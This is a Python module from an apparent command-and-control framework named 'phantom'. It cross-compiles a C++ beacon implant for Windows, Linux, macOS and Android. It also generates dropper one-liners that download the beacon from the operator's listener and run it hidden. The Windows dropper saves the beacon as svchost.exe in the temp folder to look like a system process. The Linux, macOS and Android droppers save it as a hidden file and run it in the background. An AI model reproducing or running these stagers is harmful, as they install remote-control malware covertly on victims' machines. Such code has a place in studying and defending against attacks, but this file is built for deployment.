import os
import shutil
import subprocess
from typing import List, Dict, Any, Optional
from rich.console import Console
from phantom.utils.notifier import notifier
from phantom.utils.build_helper import check_build_env
from phantom.utils.network import get_lhost

console = Console()

def compile_beacon(platform: str, pkg_root: str) -> Optional[str]:
    """
    Compiles the C++ beacon for the specified platform.
    Returns the path to the compiled binary or None on failure.
    """
    if not check_build_env(platform):
        notifier.error(f"Build environment not ready for {platform}.")
        return None

    beacon_dir = os.path.join(pkg_root, "payloads", "beacon")
    
    if platform == "windows":
        beacon_out = os.path.join(beacon_dir, "beacon.exe")
        if os.path.exists(beacon_out): return beacon_out
        
        console.print("[yellow][*] Compiling beacon for Windows...[/yellow]")
        try:
            if os.name == 'nt':
                if not shutil.which("cl"):
                    notifier.error("'cl.exe' (MSVC) not found.")
                    return None
                subprocess.run(
                    ["cl", "/EHsc", "/O2", "/std:c++17", "src/main.cpp", "/Fe:beacon.exe",
                     "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "/SUBSYSTEM:WINDOWS"],
                    cwd=beacon_dir, check=True, capture_output=True, text=True)
            else:
                mingw_cpp = "x86_64-w64-mingw32-g++"
                if not shutil.which(mingw_cpp):
                    notifier.error(f"'{mingw_cpp}' not found for cross-compilation.")
                    return None
                subprocess.run(
                    [mingw_cpp, "-std=c++17", "-O2", "-s", "-o", "beacon.exe",
                     "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-static"],
                    cwd=beacon_dir, check=True, capture_output=True, text=True)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Windows compilation failed:\n{e.stderr}")
            return None

    elif platform == "linux":
        beacon_out = os.path.join(beacon_dir, "beacon_linux")
        if os.path.exists(beacon_out): return beacon_out
        
        console.print("[yellow][*] Compiling beacon for Linux...[/yellow]")
        try:
            subprocess.run(
                ["g++", "-std=c++17", "-O2", "-s", "-o", "beacon_linux", "src/main.cpp",
                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Linux compilation failed:\n{e.stderr}")
            return None

    elif platform == "macos":
        beacon_out = os.path.join(beacon_dir, "beacon_macos")
        if os.path.exists(beacon_out): return beacon_out
        
        console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
        osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
        o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
        if not os.path.exists(o32_cc):
            notifier.error(f"osxcross compiler not found at {o32_cc}")
            return None
        try:
            # Try to find osxcross SDK
            sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
            include_flags = []
            if os.path.exists(sdk_path):
                include_flags = [f"-isysroot{sdk_path}"]
            
            subprocess.run(
                [o32_cc, "-std=c++17", "-O2", "-o", "beacon_macos", "src/main.cpp",
                 *include_flags,
                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"macOS compilation failed:\n{e.stderr}")
            return None

    elif platform == "android":
        beacon_out = os.path.join(beacon_dir, "beacon_android")
        if os.path.exists(beacon_out): return beacon_out
        
        console.print("[yellow][*] Compiling beacon for Android (NDK)...[/yellow]")
        ndk_home = os.environ.get("ANDROID_NDK_HOME", "/opt/android-ndk")
        ndk_cc = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "bin", "aarch64-linux-android28-clang++")
        if not os.path.exists(ndk_cc):
            notifier.error(f"NDK compiler not found at {ndk_cc}")
            return None
        try:
            # Add NDK sysroot include paths
            ndk_sysroot = os.path.join(ndk_home, "toolchains", "llvm", "prebuilt", "linux-x86_64", "sysroot")
            include_paths = [
                f"-I{os.path.join(ndk_sysroot, 'usr', 'include')}",
                f"-I/usr/include",  # Host OpenSSL as fallback
            ]
            subprocess.run(
                [ndk_cc, "-std=c++17", "-O2", "-s", "-o", "beacon_android", "src/main.cpp",
                 *include_paths,
                 "-L/usr/lib/x86_64-linux-gnu",  # Host libs as fallback
                 "-lcurl", "-lssl", "-lcrypto", "-static"],
                cwd=beacon_dir, check=True, capture_output=True, text=True)
            return beacon_out
        except subprocess.CalledProcessError as e:
            notifier.error(f"Android compilation failed:\n{e.stderr}")
            return None

    return None

def generate_dropper(platform: str, lhost: str, lport: int) -> str:
    """Generates the dropper command for the specified platform with auth token."""
    from phantom.core.c2_server import PAYLOAD_AUTH_TOKEN
    
    token_param = f"auth={PAYLOAD_AUTH_TOKEN}"
    
    if platform == "windows":
        url = f"http://{lhost}:{lport}/api/v1/payload?{token_param}"
        return f"Invoke-WebRequest -Uri '{url}' -OutFile $env:TEMP\\svchost.exe; Start-Process $env:TEMP\\svchost.exe -ArgumentList '{lhost} {lport}' -WindowStyle Hidden"
    
    elif platform == "linux":
        url = f"http://{lhost}:{lport}/api/v1/payload_linux?{token_param}"
        return f"curl -s '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
        
    elif platform == "macos":
        url = f"http://{lhost}:{lport}/api/v1/payload_macos?{token_param}"
        return f"curl -s '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
        
    elif platform == "android":
        url = f"http://{lhost}:{lport}/api/v1/payload_android?{token_param}"
        return f"curl -s '{url}' -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {lhost} {lport} &"

    return ""
